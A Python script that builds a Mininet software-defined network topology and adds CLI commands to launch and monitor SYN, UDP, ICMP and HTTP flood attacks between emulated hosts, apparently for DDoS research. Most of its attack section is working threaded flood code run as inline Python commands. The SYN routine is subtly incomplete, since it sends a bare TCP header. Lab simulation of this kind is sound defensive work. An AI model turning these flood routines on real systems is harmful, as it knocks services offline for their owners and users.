#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Mininet DDoS攻擊模擬腳本
創建Mininet拓撲並提供DDoS攻擊功能
"""

import os
import argparse
from mininet.net import Mininet
from mininet.node import RemoteController
from mininet.cli import CLI
from mininet.log import setLogLevel, info
from mininet.link import TCLink
from mininet.util import dumpNodeConnections
from utils.generate_topo_diagram import (
    generate_topology_diagram,
    generate_attack_diagram,
)

# 默認控制器設置
controller_ip = "10.101.9.222"
controller_port = 6653


class MininetDDoS:
    """Mininet DDoS攻擊模擬類"""

    def __init__(self, net=None):
        """初始化MininetDDoS

        參數:
            net: Mininet網絡對象
        """
        self.net = net
        self.attack_processes = {}
        self.monitoring_process = None

    def launch_attack(
        self,
        src_hosts,
        target_host,
        attack_type="syn",
        duration=30,
        rate=100,
        threads=1,
    ):
        """從源主機啟動對目標主機的DDoS攻擊

        參數:
            src_hosts: 攻擊源主機列表 (字符串列表或主機對象列表)
            target_host: 目標主機 (字符串或主機對象)
            attack_type: 攻擊類型 (syn, udp, icmp, http)
            duration: 攻擊持續時間 (秒)
            rate: 每秒攻擊封包數量
            threads: 每個主機使用的攻擊線程數
        """
        if not self.net:
            info("*** 錯誤: 無可用的Mininet網絡\n")
            return

        # 檢查攻擊類型是否有效
        valid_types = ["syn", "udp", "icmp", "http"]
        if attack_type.lower() not in valid_types:
            info(f"*** 錯誤: 無效的攻擊類型 '{attack_type}'\n")
            info(f"*** 有效的攻擊類型: {', '.join(valid_types)}\n")
            return

        # 獲取目標主機對象
        if isinstance(target_host, str):
            if target_host not in self.net:
                info(f"*** 錯誤: 找不到目標主機 {target_host}\n")
                return
            target = self.net.get(target_host)
        else:
            target = target_host

        # 獲取源主機對象列表
        attack_hosts = []
        for host in src_hosts:
            if isinstance(host, str):
                if host not in self.net:
                    info(f"*** 警告: 找不到源主機 {host}，已跳過\n")
                    continue
                attack_hosts.append(self.net.get(host))
            else:
                attack_hosts.append(host)

        if not attack_hosts:
            info("*** 錯誤: 沒有有效的源主機可以啟動攻擊\n")
            return

        target_ip = target.IP()
        info(
            f"\n*** 啟動對 {target.name} ({target_ip}) 的 {attack_type.upper()} DDoS攻擊\n"
        )
        info(f"*** 攻擊持續時間: {duration} 秒\n")
        info(f"*** 攻擊源: {[h.name for h in attack_hosts]}\n")
        info(f"*** 每個源主機每秒攻擊封包數量: {rate}\n")
        info(f"*** 每個源主機攻擊線程數: {threads}\n")

        # 在每個源主機上啟動攻擊
        for host in attack_hosts:
            # 根據攻擊類型設置目標端口
            target_port = 80 if attack_type.lower() in ["syn", "http"] else 53

            # 構建攻擊命令
            if attack_type.lower() == "syn":
                cmd = self._build_syn_flood_cmd(
                    host, target_ip, target_port, duration, rate, threads
                )
            elif attack_type.lower() == "udp":
                cmd = self._build_udp_flood_cmd(
                    host, target_ip, duration, rate, threads
                )
            elif attack_type.lower() == "icmp":
                cmd = self._build_icmp_flood_cmd(
                    host, target_ip, duration, rate, threads
                )
            elif attack_type.lower() == "http":
                cmd = self._build_http_flood_cmd(
                    host, target_ip, target_port, duration, rate, threads
                )

            # 啟動攻擊進程
            info(f"*** 在 {host.name} 上啟動 {attack_type} 攻擊\n")
            attack_proc = host.popen(cmd, shell=True)
            self.attack_processes[host.name] = attack_proc

        # 等待攻擊完成
        info(f"*** 攻擊正在進行中，將持續 {duration} 秒...\n")

        # 返回攻擊進程字典
        return self.attack_processes

    def stop_attacks(self):
        """停止所有進行中的DDoS攻擊"""
        if not self.attack_processes:
            info("*** 沒有進行中的攻擊\n")
            return

        info("\n*** 停止所有進行中的攻擊\n")
        for host_name, proc in self.attack_processes.items():
            info(f"*** 停止 {host_name} 上的攻擊\n")
            proc.terminate()

        self.attack_processes = {}
        info("*** 所有攻擊已停止\n")

    def start_monitoring(self, hosts=None, interval=2):
        """在指定主機上啟動網絡流量監控

        參數:
            hosts: 要監控的主機列表 (如果為None，則監控所有主機)
            interval: 監控數據顯示間隔 (秒)
        """
        if not self.net:
            info("*** 錯誤: 無可用的Mininet網絡\n")
            return

        if not hosts:
            hosts = self.net.hosts

        monitor_hosts = []
        for host in hosts:
            if isinstance(host, str):
                if host not in self.net:
                    info(f"*** 警告: 找不到主機 {host}，已跳過\n")
                    continue
                monitor_hosts.append(self.net.get(host))
            else:
                monitor_hosts.append(host)

        if not monitor_hosts:
            info("*** 錯誤: 沒有有效的主機可以監控\n")
            return

        info(f"\n*** 開始監控主機: {[h.name for h in monitor_hosts]}\n")

        # 編寫監控腳本
        script = """
        #!/bin/bash
        while true; do
            echo "======= 網絡流量監控 ======="
            date
        """

        for host in monitor_hosts:
            script += f"""
            echo "--- {host.name} 流量 ---"
            ip -s -c link show {host.defaultIntf().name}
            """

        script += f"""
            sleep {interval}
            echo ""
        done
        """

        # 將腳本寫入臨時文件
        script_path = "/tmp/mininet_monitor.sh"
        with open(script_path, "w") as f:
            f.write(script)
        os.chmod(script_path, 0o755)

        # 啟動監控進程
        self.monitoring_process = self.net.get(monitor_hosts[0].name).popen(
            script_path, shell=True
        )
        info(f"*** 監控已啟動，間隔 {interval} 秒\n")

        return self.monitoring_process

    def stop_monitoring(self):
        """停止網絡流量監控"""
        if not self.monitoring_process:
            info("*** 沒有進行中的監控\n")
            return

        info("\n*** 停止網絡監控\n")
        self.monitoring_process.terminate()
        self.monitoring_process = None
        info("*** 監控已停止\n")

    def _build_syn_flood_cmd(
        self, host, target_ip, target_port, duration, rate, threads
    ):
        """構建SYN洪水攻擊命令"""
        cmd = f"""
        python -c '
import time
import random
import threading
import socket
import struct

def syn_flood(target_ip, target_port, duration, rate, thread_id):
    start_time = time.time()
    packets_sent = 0
    
    # 創建一個原始套接字
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except socket.error as e:
        print(f"無法創建套接字: {{e}}")
        return
    
    while time.time() - start_time < duration:
        # 控制發送速率
        current_time = time.time()
        elapsed = current_time - start_time
        expected_packets = rate * elapsed / {threads}
        
        if packets_sent < expected_packets:
            # 建立IP頭
            src_ip = f"10.0.0.{{random.randint(1, 254)}}"
            src_port = random.randint(1024, 65535)
            
            # 構建TCP頭，SYN標誌設為1
            tcp_header = struct.pack("!HHLLBBHHH", 
                src_port,                    # 源端口
                {target_port},               # 目標端口
                0,                           # 序列號
                0,                           # 確認號
                5 << 4,                      # 頭部長度 (5*4=20 bytes)
                2,                           # 標誌 (SYN=1)
                8192,                        # 窗口大小
                0,                           # 校驗和 (填0讓操作系統計算)
                0)                           # 緊急指針
            
            packet = tcp_header
            try:
                sock.sendto(packet, (f"{target_ip}", 0))
                packets_sent += 1
            except:
                pass
        else:
            time.sleep(0.001)

# 創建並啟動攻擊線程
threads = []
for i in range({threads}):
    t = threading.Thread(target=syn_flood, 
                        args=("{target_ip}", {target_port}, {duration}, {rate}, i))
    t.daemon = True
    threads.append(t)
    t.start()

# 等待所有線程完成
for t in threads:
    t.join()
'
        """
        return cmd

    def _build_udp_flood_cmd(self, host, target_ip, duration, rate, threads):
        """構建UDP洪水攻擊命令"""
        cmd = f"""
        python -c '
import time
import random
import threading
import socket

def udp_flood(target_ip, duration, rate, thread_id):
    start_time = time.time()
    packets_sent = 0
    
    # 創建UDP套接字
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while time.time() - start_time < duration:
        # 控制發送速率
        current_time = time.time()
        elapsed = current_time - start_time
        expected_packets = rate * elapsed / {threads}
        
        if packets_sent < expected_packets:
            # 隨機目標端口
            dst_port = random.randint(1, 65535)
            
            # 創建隨機大小的數據包
            payload_size = random.randint(64, 1024)
            payload = b"X" * payload_size
            
            try:
                sock.sendto(payload, (target_ip, dst_port))
                packets_sent += 1
            except:
                pass
        else:
            time.sleep(0.001)

# 創建並啟動攻擊線程
threads = []
for i in range({threads}):
    t = threading.Thread(target=udp_flood, 
                        args=("{target_ip}", {duration}, {rate}, i))
    t.daemon = True
    threads.append(t)
    t.start()

# 等待所有線程完成
for t in threads:
    t.join()
'
        """
        return cmd

    def _build_icmp_flood_cmd(self, host, target_ip, duration, rate, threads):
        """構建ICMP洪水攻擊命令"""
        cmd = f"""
        python -c '
import time
import random
import threading
import socket
import struct

def icmp_flood(target_ip, duration, rate, thread_id):
    start_time = time.time()
    packets_sent = 0
    
    # 創建ICMP套接字
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except socket.error as e:
        print(f"無法創建套接字: {{e}}")
        return
    
    while time.time() - start_time < duration:
        # 控制發送速率
        current_time = time.time()
        elapsed = current_time - start_time
        expected_packets = rate * elapsed / {threads}
        
        if packets_sent < expected_packets:
            # 建立ICMP頭
            icmp_type = 8  # Echo Request
            icmp_code = 0
            icmp_checksum = 0
            icmp_id = random.randint(1, 65535)
            icmp_seq = random.randint(1, 65535)
            
            # 封包頭部 (類型, 代碼, 校驗和, 標識, 序列號)
            icmp_header = struct.pack("!BBHHH", 
                                      icmp_type, icmp_code, icmp_checksum, 
                                      icmp_id, icmp_seq)
            
            # 數據部分
            payload = b"X" * 56
            
            # 計算校驗和
            checksum = 0
            for i in range(0, len(icmp_header + payload), 2):
                if i + 1 < len(icmp_header + payload):
                    checksum += (icmp_header + payload)[i] + ((icmp_header + payload)[i+1] << 8)
                else:
                    checksum += (icmp_header + payload)[i]
            checksum = (checksum >> 16) + (checksum & 0xffff)
            checksum = ~checksum & 0xffff
            
            # 重新構建帶有正確校驗和的頭部
            icmp_header = struct.pack("!BBHHH", 
                                     icmp_type, icmp_code, checksum, 
                                     icmp_id, icmp_seq)
            
            packet = icmp_header + payload
            
            try:
                sock.sendto(packet, (target_ip, 0))
                packets_sent += 1
            except:
                pass
        else:
            time.sleep(0.001)

# 創建並啟動攻擊線程
threads = []
for i in range({threads}):
    t = threading.Thread(target=icmp_flood, 
                        args=("{target_ip}", {duration}, {rate}, i))
    t.daemon = True
    threads.append(t)
    t.start()

# 等待所有線程完成
for t in threads:
    t.join()
'
        """
        return cmd

    def _build_http_flood_cmd(
        self, host, target_ip, target_port, duration, rate, threads
    ):
        """構建HTTP洪水攻擊命令"""
        cmd = f"""
        python -c '
import time
import random
import threading
import socket

def http_flood(target_ip, target_port, duration, rate, thread_id):
    start_time = time.time()
    packets_sent = 0
    
    # 建立HTTP請求列表
    http_requests = [
        f"GET / HTTP/1.1\\r\\nHost: {{target_ip}}\\r\\nUser-Agent: Mozilla/5.0\\r\\n\\r\\n",
        f"GET /index.html HTTP/1.1\\r\\nHost: {{target_ip}}\\r\\n\\r\\n",
        f"GET /search?q=test HTTP/1.1\\r\\nHost: {{target_ip}}\\r\\n\\r\\n",
        f"GET /login HTTP/1.1\\r\\nHost: {{target_ip}}\\r\\nConnection: keep-alive\\r\\n\\r\\n",
    ]
    
    while time.time() - start_time < duration:
        # 控制發送速率
        current_time = time.time()
        elapsed = current_time - start_time
        expected_packets = rate * elapsed / {threads}
        
        if packets_sent < expected_packets:
            try:
                # 建立TCP連接
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)  # 設置超時
                s.connect(("{target_ip}", {target_port}))
                
                # 發送HTTP GET請求
                request = random.choice(http_requests)
                s.send(request.encode())
                s.close()
                
                packets_sent += 1
            except:
                # 忽略連接錯誤
                pass
        else:
            time.sleep(0.001)

# 創建並啟動攻擊線程
threads = []
for i in range({threads}):
    t = threading.Thread(target=http_flood, 
                        args=("{target_ip}", {target_port}, {duration}, {rate}, i))
    t.daemon = True
    threads.append(t)
    t.start()

# 等待所有線程完成
for t in threads:
    t.join()
'
        """
        return cmd


def create_topo(
    switch_count=1,
    host_count=2,
    controller_ip=controller_ip,
    controller_port=controller_port,
    bandwidth=None,
    delay=None,
    default_controller=False,
    generate_diagram=False,
):
    """創建自定義網絡拓撲並啟動

    參數:
        switch_count (int): 交換機數量
        host_count (int): 主機數量
        controller_ip (str): 控制器IP地址
        controller_port (int): 控制器端口
        bandwidth (int): 鏈路頻寬 (Mbps)
        delay (str): 鏈路延遲 (例如 '10ms')
        default_controller (bool): 是否使用Mininet默認控制器
        generate_diagram (bool): 是否生成網絡拓撲圖
    """

    # 在啟動前先清理環境，避免接口衝突
    info("*** 清理舊的Mininet環境\n")
    os.system("sudo mn -c")

    if default_controller:
        # 使用默認控制器（用於測試連通性）
        info("*** 使用Mininet默認控制器\n")
        net = Mininet(link=TCLink)
        net.addController("c0")
    else:
        # 創建網絡，使用外部控制器
        info(f"*** 使用外部控制器: {controller_ip}:{controller_port}\n")
        net = Mininet(controller=RemoteController, link=TCLink)
        # 添加控制器，連接到指定的Ryu控制器
        c0 = net.addController(
            "c0", controller=RemoteController, ip=controller_ip, port=controller_port
        )

    info("*** 網絡配置:\n")
    info(f"*** 控制器IP: {controller_ip}, 端口: {controller_port}\n")
    info(f"*** 交換機數量: {switch_count}, 主機數量: {host_count}\n")
    if bandwidth:
        info(f"*** 頻寬限制: {bandwidth} Mbps\n")
    if delay:
        info(f"*** 延遲設置: {delay}\n")

    # 添加交換機
    switches = []
    for s in range(1, switch_count + 1):
        switch = net.addSwitch(f"s{s}")
        switches.append(switch)

    # 如果有多個交換機，將它們連接成一個線性拓撲
    for i in range(len(switches) - 1):
        link_opts = {}
        if bandwidth:
            link_opts["bw"] = bandwidth
        if delay:
            link_opts["delay"] = delay
        net.addLink(switches[i], switches[i + 1], **link_opts)

    # 添加主機
    hosts = []
    for h in range(1, host_count + 1):
        host = net.addHost(f"h{h}", ip=f"10.0.0.{h}/24")
        hosts.append(host)

    # 將主機連接到交換機 (均勻分配)
    for i, host in enumerate(hosts):
        # 決定要連接到哪個交換機
        switch_index = i % len(switches)
        link_opts = {}
        if bandwidth:
            link_opts["bw"] = bandwidth
        if delay:
            link_opts["delay"] = delay
        net.addLink(host, switches[switch_index], **link_opts)

    # 啟動網絡
    net.start()

    # 打印節點連接信息
    info("\n*** 打印節點連接信息\n")
    dumpNodeConnections(net.hosts)
    dumpNodeConnections(net.switches)

    # 創建MininetDDoS對象
    mininet_ddos = MininetDDoS(net)

    # 擴展CLI命令，添加DDoS攻擊相關命令
    # 添加自定義命令到CLI
    CLI.do_ddos = lambda cli, line: do_ddos(cli, line, mininet_ddos)
    CLI.do_monitor = lambda cli, line: do_monitor(cli, line, mininet_ddos)
    CLI.do_stop_ddos = lambda cli, line: do_stop_ddos(cli, line, mininet_ddos)
    CLI.do_stop_monitor = lambda cli, line: do_stop_monitor(cli, line, mininet_ddos)
    CLI.do_visualize = lambda cli, line: do_visualize_topo(cli, line, mininet_ddos)

    # 測試連通性
    info("\n*** 測試網絡連通性\n")
    # 設置較短的超時時間，避免等待時間過長
    net.pingAll(timeout=1)

    # 如果要求生成拓撲圖，在這裡生成
    if generate_diagram:
        info("\n*** 生成網絡拓撲圖 ***\n")
        generate_topology_diagram(
            switch_count=switch_count,
            host_count=host_count,
            filename="network_topology.png",
        )
        info("拓撲圖已保存為: network_topology-flow.png\n")

    # 啟動命令行界面
    info("\n*** 啟動Mininet CLI\n")
    info("*** 可用命令:\n")
    info("***   pingall - 測試所有主機間連通性\n")
    info("***   h1 ping h2 - 測試特定主機間連通性\n")
    info("***   ddos target_host src_host1 [src_host2 ...] - 啟動DDoS攻擊\n")
    info("***   stop_ddos - 停止所有DDoS攻擊\n")
    info("***   monitor [host1 host2 ...] - 監控網絡流量\n")
    info("***   stop_monitor - 停止網絡監控\n")
    info("***   visualize [--attack] [--target 目標主機] - 生成網絡拓撲圖\n")
    info("***   exit - 退出\n")

    CLI(net)

    # 停止網絡
    info("\n*** 停止網絡\n")
    net.stop()


def do_ddos(cli, line, mininet_ddos):
    """啟動DDoS攻擊
    用法: ddos 目標主機 源主機1 [源主機2 ...] [--type 類型] [--rate 速率] [--duration 持續時間] [--threads 線程數]
    例如: ddos h1 h2 h3 h4 --type syn --rate 1000 --duration 30 --threads 5
    """
    args = line.split()
    if len(args) < 2:
        info(
            "用法: ddos 目標主機 源主機1 [源主機2 ...] [--type 類型] [--rate 速率] [--duration 持續時間] [--threads 線程數]\n"
        )
        return

    # Parse command line arguments
    target_host = args[0]

    # 查找可選參數的位置
    src_hosts = []
    opt_start_idx = len(args)
    for i, arg in enumerate(args[1:], 1):
        if arg.startswith("--"):
            opt_start_idx = i
            break
        src_hosts.append(arg)

    if not src_hosts:
        info("錯誤: 至少需要指定一個源主機\n")
        return

    # 解析可選參數
    attack_type = "syn"
    rate = 100
    duration = 30
    threads = 1

    i = opt_start_idx
    while i < len(args):
        if args[i] == "--type" and i + 1 < len(args):
            attack_type = args[i + 1]
            i += 2
        elif args[i] == "--rate" and i + 1 < len(args):
            try:
                rate = int(args[i + 1])
                i += 2
            except ValueError:
                info(f"錯誤: 速率必須是整數，但收到了 '{args[i + 1]}'\n")
                return
        elif args[i] == "--duration" and i + 1 < len(args):
            try:
                duration = int(args[i + 1])
                i += 2
            except ValueError:
                info(f"錯誤: 持續時間必須是整數，但收到了 '{args[i + 1]}'\n")
                return
        elif args[i] == "--threads" and i + 1 < len(args):
            try:
                threads = int(args[i + 1])
                i += 2
            except ValueError:
                info(f"錯誤: 線程數必須是整數，但收到了 '{args[i + 1]}'\n")
                return
        else:
            i += 1

    # 啟動攻擊
    mininet_ddos.launch_attack(
        src_hosts, target_host, attack_type, duration, rate, threads
    )


def do_stop_ddos(cli, line, mininet_ddos):
    """停止所有DDoS攻擊
    用法: stop_ddos
    """
    mininet_ddos.stop_attacks()


def do_monitor(cli, line, mininet_ddos):
    """監控網絡流量
    用法: monitor [主機1 主機2 ...]
    例如: monitor h1 h2
    """
    args = line.split()
    hosts = args if args else None
    mininet_ddos.start_monitoring(hosts)


def do_stop_monitor(cli, line, mininet_ddos):
    """停止網絡監控
    用法: stop_monitor
    """
    mininet_ddos.stop_monitoring()


def do_visualize_topo(cli, line, mininet_ddos):
    """Generate network topology visualization
    Usage: visualize [--attack] [--target target_host] [--filename filename]
    Examples: visualize
              visualize --attack --target h1
    """
    parts = line.split()
    attack_mode = False
    target_host = None
    filename = "network_topology.png"

    # Parse arguments
    i = 0
    while i < len(parts):
        if parts[i] == "--attack":
            attack_mode = True
            i += 1
        elif parts[i] == "--target" and i + 1 < len(parts):
            target_host = parts[i + 1]
            i += 2
        elif parts[i] == "--filename" and i + 1 < len(parts):
            filename = parts[i + 1]
            i += 2
        else:
            i += 1

    # Get relevant data
    net = mininet_ddos.net
    switch_count = len([node for node in net.values() if node.name.startswith("s")])
    host_count = len([node for node in net.values() if node.name.startswith("h")])

    if attack_mode and target_host:
        # Generate attack scenario topology diagram
        # Get list of attacking hosts from running attacks
        attack_hosts = []
        for host in mininet_ddos.attack_processes:
            if mininet_ddos.attack_processes[host]:
                attack_hosts.append(host)

        if (
            not attack_hosts
        ):  # If no attacks are running, use the first 3 hosts as examples
            attack_hosts = [f"h{i+1}" for i in range(min(3, host_count))]

        # Determine attack type
        # Since attack_processes contains Popen objects, not dictionaries
        attack_type = "DDoS"

        generate_attack_diagram(
            switch_count=switch_count,
            host_count=host_count,
            target_host=target_host,
            attack_hosts=attack_hosts,
            attack_type=attack_type,
            filename=filename,
        )
        info(f"Attack scenario topology diagram generated: {filename}\n")
    else:
        # Generate regular topology diagram
        generate_topology_diagram(
            switch_count=switch_count, host_count=host_count, filename=filename
        )
        info(f"Network topology diagram generated: {filename}\n")


if __name__ == "__main__":
    # Parse command line arguments
    parser = argparse.ArgumentParser(
        description="Create Mininet topology with DDoS attack functionality"
    )
    parser.add_argument(
        "-s", "--switches", type=int, default=1, help="Number of switches"
    )
    parser.add_argument("-n", "--hosts", type=int, default=2, help="Number of hosts")
    parser.add_argument(
        "-c",
        "--controller",
        type=str,
        default=controller_ip,
        help="Controller IP address",
    )
    parser.add_argument(
        "-p", "--port", type=int, default=controller_port, help="Controller port"
    )
    parser.add_argument("-b", "--bandwidth", type=int, help="Link bandwidth (Mbps)")
    parser.add_argument("-d", "--delay", type=str, help='Link delay (e.g. "10ms")')
    parser.add_argument(
        "--default-controller",
        action="store_true",
        help="Use default controller instead of external controller",
    )
    parser.add_argument(
        "--visualize",
        action="store_true",
        help="Generate and save network topology diagram",
    )

    args = parser.parse_args()

    # Set log level
    setLogLevel("info")

    # Create topology
    create_topo(
        switch_count=args.switches,
        host_count=args.hosts,
        controller_ip=args.controller,
        controller_port=args.port,
        bandwidth=args.bandwidth,
        delay=args.delay,
        default_controller=args.default_controller,
        generate_diagram=args.visualize,
    )
